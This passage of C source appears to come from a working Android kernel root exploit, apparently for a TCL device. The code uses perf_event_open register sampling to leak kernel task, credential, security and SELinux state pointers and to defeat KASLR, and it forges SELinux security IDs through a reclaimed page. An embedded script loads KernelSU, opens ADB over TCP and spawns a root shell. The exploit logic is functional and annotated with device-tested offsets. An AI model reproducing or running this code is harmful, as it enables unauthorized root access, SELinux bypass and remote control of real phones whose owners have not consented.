    "    if ! kill -0 \"$KSUD_PID\" 2>/dev/null; then KSUD_EXITED=1; break; fi\n"
    "    sleep 1\n"
    "  done\n"
    "  if [ \"$KSUD_EXITED\" = 1 ]; then\n"
    "    wait \"$KSUD_PID\"; KSUD_STATUS=$?\n"
    "    diag '[*] ksud exit='$KSUD_STATUS\n"
    "  else\n"
    "    diag '[!] ksud still running after 30s; capturing process state'\n"
    "    cat /proc/$KSUD_PID/status >>$ROOT_LOG 2>&1\n"
    "    cat /proc/$KSUD_PID/wchan >>$ROOT_LOG 2>&1\n"
    "  fi\n"
    "  if [ -s \"$KSUD_LOG\" ]; then\n"
    "    diag '[*] ksud output:'\n"
    "    tail -n 40 \"$KSUD_LOG\"\n"
    "    tail -n 40 \"$KSUD_LOG\" >>$ROOT_LOG\n"
    "  fi\n"
    "fi\n"
    "if grep -q kernelsu /proc/modules 2>/dev/null; then KSU_READY=1; fi\n"
    "if [ \"$KSU_READY\" = 1 ]; then\n"
    "  diag '[+] KSU LOADED'\n"
    "  grep kernelsu /proc/modules\n"
    "  RSPROP=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "  if [ -n \"$RSPROP\" ]; then\n"
    "    chmod 755 \"$RSPROP\" 2>/dev/null\n"
    "    ADB_PORT=$(cat /data/local/tmp/a/adb_port 2>/dev/null || echo 5555)\n"
    "    \"$RSPROP\" resetprop -p persist.adb.tcp.port $ADB_PORT 2>&1 && echo \"[+] persist.adb.tcp.port=$ADB_PORT set via resetprop\"\n"
    "    \"$RSPROP\" resetprop service.adb.tcp.port $ADB_PORT 2>/dev/null\n"
    "  fi\n"
    "  rm -f /data/local/tmp/.ghostlock_w1\n"
    "  APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed 's/package://')\n"
    "  if [ -n \"$APK\" ] && [ -x /data/adb/ksud ]; then\n"
    "    /data/adb/ksud kernel dynamic-manager set-apk \"$APK\" 2>/dev/null && echo '[+] dynamic manager set'\n"
    "  fi\n"
    "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "  diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "  report_status ready\n"
    "  diag '[+] done'\n"
    "else\n"
    "  echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "  diag '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "  report_status failed:module-not-loaded\n"
    "  diag '[!] KSU NOT loaded'\n"
    "fi\n"
    "if [ -t 0 ]; then exec /system/bin/sh -i; fi\n";
  if (!policy_script_ready) {
    pr_info("root script: early policy repair script unavailable\n");
  }
  write(sfd, script, strlen(script));
  close(sfd);
}

uint64_t g_leaked_task = 0;
uintptr_t g_leaked_cred = 0;
int g_route_write_ok = 0;
int g_selinux_write_armed = 0;
int g_selinux_off = 0;
uintptr_t g_selinux_target = 0;
uintptr_t g_init_user_ns_addr = 0;
int g_hit_block = -1;
uintptr_t g_ns_cands[16];
int g_ns_cand_count = 0;

/* ---- raw (libc-free) output helpers for the post-walk path ----------
 * After the walks fire the main thread must not call ANY libc function
 * that can take a lock or touch a futex (printf/malloc deadlocked the
 * exploit on device - the hb->lock wedge, see HANDOVER_2). These
 * helpers format into stack buffers and issue raw syscalls only. */
static void raw_wstr(long fd, const char *s) {
  syscall(__NR_write, fd, s, __builtin_strlen(s));
}
static void raw_whex(long fd, uint64_t v) {
  static const char h[] = "0123456789abcdef";
  char b[19];
  b[0] = '0'; b[1] = 'x';
  for (int i = 0; i < 16; i++)
    b[2 + i] = h[(v >> ((15 - i) * 4)) & 0xf];
  b[18] = 0;
  syscall(__NR_write, fd, b, 18);
}
static void raw_wdec(long fd, long v) {
  char b[24];
  size_t n = 0;
  unsigned long u = (v < 0) ? (unsigned long)(-v) : (unsigned long)v;
  char t[24]; size_t tn = 0;
  do { t[tn++] = (char)('0' + (u % 10)); u /= 10; } while (u);
  if (v < 0) b[n++] = '-';
  while (tn) b[n++] = t[--tn];
  syscall(__NR_write, fd, b, n);
}
#define RAW_WRITE(fd, s) raw_wstr(fd, s)
#define RAW_WERRNO(fd) do { raw_wstr(fd, " errno="); raw_wdec(fd, errno); } while (0)

/* ---- crash-free SID resolution helpers (post-walk: raw syscalls only) ---
 * The fake security blob lives on the reclaim page at FAKE_SEC_BLOB_OFF;
 * blob->sid (profile-selected; +4 on V643) is re-read by the kernel on every SELinux hook, so the
 * parent can steer current_sid() through the uring mapping. Verification
 * reads /proc/self/attr/current (self-attr read takes NO avc check, just
 * sid -> context string). The old 32K-openat brute force panicked the
 * device; these helpers back the candidate-first + bounded-scan flow. */
static void blob_set_sid(uint8_t *page, uint32_t sid) {
  for (unsigned f = 0; f < TASK_SECURITY_SIZE; f += 4)
    *(volatile uint32_t *)(page + FAKE_SEC_BLOB_OFF + f) = sid;
  __atomic_thread_fence(__ATOMIC_SEQ_CST);
}

static long sid_read_ctx(char *buf, long buflen) {
  int af = (int)syscall(__NR_openat, AT_FDCWD,
                        "/proc/self/attr/current", O_RDONLY, 0);
  if (af < 0) return -1;
  long an = syscall(__NR_read, af, buf, (size_t)(buflen - 1));
  syscall(__NR_close, af);
  if (an > 0) {
    /* strip trailing NUL / newline the kernel may include */
    while (an > 0 && (buf[an-1] == '\n' || buf[an-1] == 0)) an--;
    buf[an] = 0;
  }
  return an;
}

static long sid_strlen(const char *s) { long n = 0; while (s[n]) n++; return n; }

static int sid_memeq(const char *a, const char *b, long n) {
  for (long i = 0; i < n; i++) if (a[i] != b[i]) return 0;
  return 1;
}

static int sid_contains(const char *hay, long hlen, const char *needle) {
  long nlen = sid_strlen(needle);
  if (nlen == 0 || nlen > hlen) return 0;
  for (long i = 0; i + nlen <= hlen; i++)
    if (sid_memeq(hay + i, needle, nlen)) return 1;
  return 0;
}

/* Does the context readback match the shell creds the relay child had
 * before the exploit? Exact match against the child's context when we
 * have it, else a "shell" substring check. */
static int sid_ctx_is_shell(const char *ctx, long len, const char *child_ctx) {
  if (len <= 0) return 0;
  long clen = sid_strlen(child_ctx);
  if (clen > 0)
    return len == clen && sid_memeq(ctx, child_ctx, clen);
  return sid_contains(ctx, len, "shell");
}

static void sid_nanosleep_usec(long usec) {
  struct timespec ts;
  ts.tv_sec = usec / 1000000;
  ts.tv_nsec = (usec % 1000000) * 1000;
  syscall(__NR_nanosleep, &ts, NULL);
}

/* Leak our own task_struct via PERF_SAMPLE_REGS_INTR: on this kernel
 * `current` lives in SP_EL0 and every syscall path loads it into a normal
 * x register (mrs x8, SP_EL0), so a getpid storm makes the task pointer
 * the modal kernel value in the sampled registers. */
static uintptr_t perf_leak_own_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_TID | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 31) - 1; /* x0-x30 */
  pe.disabled = 1;

  uint32_t my_tid = (uint32_t)syscall(__NR_gettid);

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 3000000; i++) { syscall(__NR_getpid); __asm__ volatile("yield"); }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[1024]; int nc = 0;
  uint64_t min_ip = (uint64_t)-1;
  int total_samples = 0, my_samples = 0;
  while (pos < head && nc < 1024 * 32) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      /* sample layout: IP(8) + TID{pid(4),tid(4)} + ABI(8) + REGS(31*8) */
      char *p = (char *)ev + sizeof(*ev);
      uint64_t ip; memcpy(&ip, p, 8); p += 8;
      uint32_t s_pid, s_tid;
      memcpy(&s_pid, p, 4); memcpy(&s_tid, p + 4, 4); p += 8;
      if (ip >= 0xffffffc000000000ULL && ip < min_ip) min_ip = ip;
      total_samples++;
      if (s_tid == my_tid) {
        my_samples++;
        uint64_t abi = *(uint64_t *)p; p += 8;
        if (abi == 1 || abi == 2) {
          uint64_t *regs = (uint64_t *)p;
          for (int i = 0; i < 31 && nc < 1024 * 32; i++) {
            uint64_t v = regs[i];
            if (v >= 0xffffff8000000000ULL && v < 0xffffffc000000000ULL)
              cands[nc++ & 1023] = v;
          }
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  pr_info("perf task: %d/%d samples from tid %u\n", my_samples, total_samples, my_tid);
  if (min_ip != (uint64_t)-1) {
    /* KASLR anchor recovery for THIS kernel (VA39, 5.15.170-android14-11):
     *
     * DEVICE-VERIFIED MODEL (pstore boot print + perf symbol leak):
     *   - kaslr_offset() slides by a value ≡ 0x80000 (mod 2MB): two
     *     observed boot prints are "Kernel Offset: 0x1600080000" and
     *     "0x2500080000 from 0xffffffc008000000" -> runtime _text =
     *     2MB_block_base + 0x80000.
     *   - the reference vmlinux (r00, clang-22/LTO_NONE) links _text =
     *     0xffffffc008000000 (2MB-aligned) with symbols at table
     *     offsets measured from _text - but the RUNNING kernel is the
     *     ThinLTO/clang-17 build whose .text prefix is 0x80000 SMALLER:
     *     every device symbol sits at (device _text) + (table offset -
     *     0x80000). Proven live: the perf leak of &init_user_ns matches
     *     (min_ip & ~0x1fffff) + off_init_user_ns on every run.
     *   - .entry.text sits ~0x10000-0xb5000 into the image, so min_ip
     *     (every getpid traverses the el0_svc vector path) always lands
     *     in _text's own 2MB block.
     *
     * Therefore the SYMBOL ANCHOR this exploit needs - the base B such
     * that B + any table offset = the device's true symbol address - is
     * exactly B = min_ip & ~0x1fffff = device _text - 0x80000.
     * (The old `(min_ip & ~0x1fffff) | 0x80000` computed the true _text,
     * but no table offset is relative to it on this build; nothing
     * dereferenced a kaslr address before, so the distinction was never
     * observable.) The sanity gate below checks the anchor: B - link
     * _text must be a 2MB multiple because both the slide (from the
     * boot print) and the -0x80000 layout shift are ≡ 0x80000 mod 2MB. */
    uint64_t base = min_ip & ~0x1fffffULL;
    int base_ok = 1;
    if (active_offsets && active_offsets->kimage_text_base) {
      uint64_t link = active_offsets->kimage_text_base;
      /* KASLR may place the runtime image below OR above the link address.
       * The V643 salon boot observed anchor=0xffffffc003800000, exactly
       * 0x04800000 below link _text.  Validate the absolute distance rather
       * than rejecting every negative slide through unsigned wrap. */
      uint64_t distance = base >= link ? base - link : link - base;
      if ((distance & (0x200000ULL - 1)) != 0 ||
          distance >= 0x4000000000ULL /* VA39 KASLR region bound */) {
        base_ok = 0;
        pr_warning("perf min_ip=%016lx -> anchor %016lx fails sanity vs "
                   "link _text %016lx (delta must be a 2MB multiple)\n",
                   (unsigned long)min_ip, (unsigned long)base,
                   (unsigned long)link);
      }
    }
    if (base_ok) {
      kaslr_base = base;
      kaslr_done = 1;
      pr_info("kaslr: min_ip=%016lx anchor=%016lx (device _text=%016lx, "
              "slide=%016lx)\n",
              (unsigned long)min_ip, (unsigned long)kaslr_base,
              (unsigned long)(kaslr_base + 0x80000ULL),
              (unsigned long)(kaslr_base + 0x80000ULL -
                (active_offsets ? active_offsets->kimage_text_base : 0)));
    } else {
      /* DO NOT trust kaslr_base: keep kaslr_done = 0 so the mode-7
       * SELinux write (which targets kaslr_base + off_selinux_enforcing)
       * is not armed against a guessed base - a wrong .bss write can
       * panic the kernel. Mode 6 (page-local fake cred) still runs. */
      kaslr_done = 0;
    }
  } else {
    kaslr_done = 0;
  }
  if (!nc) return 0;
  /* top-2 modes: #1 = task, #2 = cred (current_cred() is loaded during
   * getpid on this kernel -- perf_event_open samples both as linmap ptrs) */
  uintptr_t best = 0, second = 0;
  int best_cnt = 0, second_cnt = 0;
  int total = nc > 1024 ? 1024 : nc;
  for (int i = 0; i < total; i++) {
    int cnt = 0;
    for (int j = 0; j < total; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) {
      second = best; second_cnt = best_cnt;
      best_cnt = cnt; best = cands[i];
    } else if (cnt > second_cnt && cands[i] != best) {
      second_cnt = cnt; second = cands[i];
    }
  }
  pr_info("perf own task: 0x%016lx (%d/%d votes)\n", best, best_cnt, total);
  if (second_cnt > 0)
    pr_info("perf cred candidate: 0x%016lx (%d votes)\n", second, second_cnt);
  /* Stash second-mode as potential cred for security-pointer leak */
  extern uintptr_t g_leaked_security_ptr;
  if (second_cnt >= 10 && !g_leaked_security_ptr) {
    /* second is likely cred. cred->security is at cred+0x78.
     * We can't dereference it, but we can use it in the setpriority
     * storm exclusion (perf_leak_cred_security pass 2). */
  }
  g_leaked_cred = second_cnt >= 10 ? second : 0;
  return best;
}

/* Leak &init_user_ns: setpriority(-20) is denied but still runs the full
 * capable(CAP_SYS_NICE) path where security_capable(current_cred(),
 * &init_user_ns, ...) hands &init_user_ns to the SELinux hook chain
 * (x0=cred, x1=ns in selinux_capable). Collect modal image-VA pointers. */
#define MAX_NS_CANDS 16
static int perf_leak_init_user_ns(uintptr_t task, uintptr_t *out) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 2000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 31) - 1;
  pe.disabled = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open(ns) failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap(ns) failed\n"); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 60000; i++) {
    setpriority(PRIO_PROCESS, 0, -20);
    syscall(__NR_getpid);
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[512]; int nc = 0;
  while (pos < head && nc < 512 * 16) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 31 && nc < 512 * 16; i++) {
          uint64_t v = regs[i];
          /* image VA range (text+rodata+data): kaslr_base .. +0x1d00000 */
          if (v >= kaslr_base && v < kaslr_base + 0x1D00000ULL &&
              (v & 7) == 0 && v != task)
            cands[nc++ & 511] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  /* rank by frequency */
  int total = nc > 512 ? 512 : nc;
  uintptr_t ranked[MAX_NS_CANDS]; int ranked_cnt[MAX_NS_CANDS]; int nrank = 0;
  for (int i = 0; i < total && nrank < MAX_NS_CANDS; i++) {
    int found = -1;
    for (int j = 0; j < nrank; j++) if (ranked[j] == cands[i]) { found = j; break; }
    if (found >= 0) { ranked_cnt[found]++; continue; }
    ranked[nrank] = cands[i]; ranked_cnt[nrank] = 1; nrank++;
  }
  /* sort desc */
  for (int i = 0; i < nrank - 1; i++)
    for (int j = i + 1; j < nrank; j++)
      if (ranked_cnt[j] > ranked_cnt[i]) {
        uintptr_t t = ranked[i]; ranked[i] = ranked[j]; ranked[j] = t;
        int tc = ranked_cnt[i]; ranked_cnt[i] = ranked_cnt[j]; ranked_cnt[j] = tc;
      }
  for (int i = 0; i < nrank && i < MAX_NS_CANDS; i++)
    out[i] = ranked[i];
  int got = nrank < MAX_NS_CANDS ? nrank : MAX_NS_CANDS;
  for (int i = 0; i < got; i++)
    pr_info("init_user_ns candidate[%d]: %016lx (%d votes)\n", i,
            (unsigned long)out[i], ranked_cnt[i]);
  return got;
}

/* The exact TCL image keeps static text/data symbols at the canonical
 * kimage alias.  Perf may also report a linear/trampoline alias whose 2 MiB
 * block changes between samples; that alias must never be used to build
 * persistent pointers inside fake credentials.  The exact vmlinux proves
 * init_cred+cred.user_ns contains canonical &init_user_ns. */
static uintptr_t runtime_static_symbol_base(void) {
  if (active_offsets &&
      active_offsets->reclaim_route == GHOST_RECLAIM_TCL_V643_EXACT &&
      active_offsets->kimage_text_base)
    return active_offsets->kimage_text_base;
  return kaslr_base;
}

/* perf_find_task - only used when perf is available (shell context) */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

/* Device-side validation of the offsets table BEFORE the mode-7 blind
 * write: perf-sample the register that security_capable() receives as
 * &init_user_ns during a setpriority(-20) storm (denied, but the full
 * capable() path still runs) and check that kaslr_base +
 * off_init_user_ns appears among the modal image-range candidates.
 * init_user_ns lives in the same .data/.bss region as selinux_state
 * (0x121B080 vs 0x13796D0 on this kernel), so a match proves the
 * RUNNING kernel's data layout matches this table (the device kernel
 * is built with a different toolchain than the reference vmlinux, and
 * nothing else validated a .data symbol on device yet). Returns 1 on
 * match, 0 on mismatch/leak-failure (caller falls back to mode 6). */
/* Leak + rank the image-range register candidates of a setpriority(-20)
 * storm (the capable() path). INFORMATIONAL ONLY since the device .data
 * layout is shifted ~+0x750000 from the reference vmlinux: the device's
 * real &init_user_ns is ~anchor+0x19EB898 (observed), while the reference
 * table says anchor+0x121B080 (a .rodata address on the device - matching
 * it is a false positive). The storm is kept because (a) the candidate
 * census is useful diagnostics, and (b) RLIMIT_NICE=40 on this device
 * lets the setpriority calls succeed, parking the main thread at nice
 * -20, which the later threads inherit and which protects the critical
 * discard->capture window from preemption. */
static int validate_device_symbol_layout(void) {
  uintptr_t want = runtime_static_symbol_base() +
                   active_offsets->off_init_user_ns;
  uintptr_t cands[MAX_NS_CANDS];
  int n = perf_leak_init_user_ns(g_leaked_task, cands);
  g_ns_cand_count = 0;
  for (int i = 0; i < n && i < 16; i++)
    g_ns_cands[i] = cands[i];
  if (n > 0)
    g_ns_cand_count = n < 16 ? n : 16;
  if (n <= 0) {
    pr_warning("ns storm leak: no candidates\n");
    return 0;
  }
  for (int i = 0; i < n; i++) {
    if (cands[i] == want) {
      pr_info("ns storm: candidate[%d] == reference-table init_user_ns "
              "%016lx (KNOWN false positive on the device layout - "
              "informational only; main thread now parked at nice -20)\n",
              i + 1, (unsigned long)want);
      g_init_user_ns_addr = cands[i];
      return 1;
    }
  }
  pr_info("ns storm: reference-table init_user_ns %016lx not among "
             "candidates (expected on the device layout; informational "
             "only; main thread now parked at nice -20)\n",
             (unsigned long)want);
  return 0;
}

/* Leak cred->security pointer via differential perf storms.
 * Pass 1 (getuid): linear-map pointers excluding task -> top mode = cred
 * Pass 2 (setpriority): linear-map pointers excluding task+cred -> top = security
 * getuid never calls SELinux hooks, so security only appears in pass 2. */
uintptr_t g_leaked_security_ptr = 0;
/* Single-pass security leak: setpriority storm excluding task+cred.
 * cred comes from perf_leak_own_task's second mode (g_leaked_cred). */
static uintptr_t perf_leak_cred_security(uintptr_t task) {
  extern uintptr_t g_leaked_cred;
  if (!g_leaked_cred) {
    pr_warning("no cred from task leak, cannot leak security\n");
    return 0;
  }
  pr_info("security leak: task=%016lx cred=%016lx, running setpriority storm\n",
          (unsigned long)task, (unsigned long)g_leaked_cred);
  struct { uintptr_t addr; int cnt; } modes[64];
  int nm = 0;
  memset(modes, 0, sizeof(modes));
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 2000;
  pe.sample_type = PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 31) - 1;
  pe.disabled = 1;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf(sec) failed\n"); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 60000; i++) {
    setpriority(PRIO_PROCESS, 0, -20);
    syscall(__NR_getpid);
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base2 = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  while (pos < head) {
    struct perf_event_header *ev = (void *)(base2 + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p2 = (char *)ev + sizeof(*ev);
      p2 += 8; /* IP */
      uint64_t abi = *(uint64_t *)p2; p2 += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p2;
        for (int r = 0; r < 31; r++) {
          uint64_t v = regs[r];
          if (v >= 0xffffff8000000000ULL && v < 0xffffffc000000000ULL &&
              v != task && v != g_leaked_cred) {
            int found = -1;
            for (int m = 0; m < nm; m++)
              if (modes[m].addr == v) { found = m; break; }
            if (found >= 0) modes[found].cnt++;
            else if (nm < 64) { modes[nm].addr = v; modes[nm].cnt = 1; nm++; }
          }
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  for (int i = 0; i < nm - 1; i++)
    for (int j = i + 1; j < nm; j++)
      if (modes[j].cnt > modes[i].cnt) {
        uintptr_t ta = modes[i].addr; int tc = modes[i].cnt;
        modes[i] = modes[j]; modes[j].addr = ta; modes[j].cnt = tc;
      }
  uintptr_t sec = nm > 0 ? modes[0].addr : 0;
  int sec_votes = nm > 0 ? modes[0].cnt : 0;
  pr_info("security leak: security=%016lx (%d votes, %d candidates)\n",
          (unsigned long)sec, sec_votes, nm);
  for (int i = 0; i < nm && i < 5; i++)
    pr_info("  candidate[%d]: %016lx (%d)\n", i,
            (unsigned long)modes[i].addr, modes[i].cnt);
  /* Reject weak leaks: a garbage cred->security pointer makes EVERY
   * post-root SELinux hook misbehave (observed: 1-vote candidate left
   * the rooted process unable to even read /proc/self/attr/current).
   * The page blob + live SID resolution is the proven fallback. */
  int minv = env_int_range("GHOST_SEC_LEAK_MIN_VOTES", 4, 1, 1000);
  if (sec && sec_votes < minv) {
    pr_warning("security leak: %d votes < min %d - REJECTED "
               "(page blob will be used)\n", sec_votes, minv);
    return 0;
  }
  return sec;
}

/* Leak &selinux_state (the LIVE address, NOT the offsets-table one):
 * the device kernel (ThinLTO/clang-17) shifts the whole .data/.bss region
 * ~+0x750000/+0x1060 relative to the reference vmlinux, so only the LIVE
 * address (or the device-derived table value) is usable. Every pread() of
 * /sys/fs/selinux/enforce runs security_file_permission ->
 * selinux_file_permission -> avc_has_perm(&selinux_state, ...) (x0 arg)
 * AND sel_read_enforce, which loads fsi->state (== &selinux_state) into
 * a callee-saved register and holds it across the whole read - a pread
 * storm makes &selinux_state (and &selinux_avc, loaded as state->avc in
 * avc_lookup, exactly 0x1828 below selinux_state in .bss) the dominant
 * image-range candidates. Returns the number of ranked candidates. */
#define MAX_SEL_CANDS 16
static int perf_leak_selinux_state(uintptr_t *out) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.size = sizeof(pe);
  pe.sample_period = 1000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 31) - 1;
  pe.disabled = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open(selinux) failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap(selinux) failed\n"); close(fd); return 0; }
  int ef = open("/sys/fs/selinux/enforce", O_RDONLY);
  char tbuf[16];
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (int i = 0; i < 200000; i++) {
    if (ef >= 0) pread(ef, tbuf, sizeof(tbuf), 0);
    syscall(__NR_getpid);
  }
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);

  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[512]; int nc = 0;
  while (pos < head && nc < 512 * 16) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 31 && nc < 512 * 16; i++) {
          uint64_t v = regs[i];
          if (v >= kaslr_base && v < kaslr_base + 0x1D00000ULL &&
              (v & 7) == 0 && v != g_leaked_task)
            cands[nc++ & 511] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (ef >= 0) close(ef);
  int total = nc > 512 ? 512 : nc;
  uintptr_t ranked[MAX_SEL_CANDS]; int ranked_cnt[MAX_SEL_CANDS]; int nrank = 0;
  for (int i = 0; i < total && nrank < MAX_SEL_CANDS; i++) {
    int found = -1;
    for (int j = 0; j < nrank; j++) if (ranked[j] == cands[i]) { found = j; break; }
    if (found >= 0) { ranked_cnt[found]++; continue; }
    ranked[nrank] = cands[i]; ranked_cnt[nrank] = 1; nrank++;
  }
  for (int i = 0; i < nrank - 1; i++)
    for (int j = i + 1; j < nrank; j++)
      if (ranked_cnt[j] > ranked_cnt[i]) {
        uintptr_t t = ranked[i]; ranked[i] = ranked[j]; ranked[j] = t;
        int tc = ranked_cnt[i]; ranked_cnt[i] = ranked_cnt[j]; ranked_cnt[j] = tc;
      }
  for (int i = 0; i < nrank; i++) {
    out[i] = ranked[i];
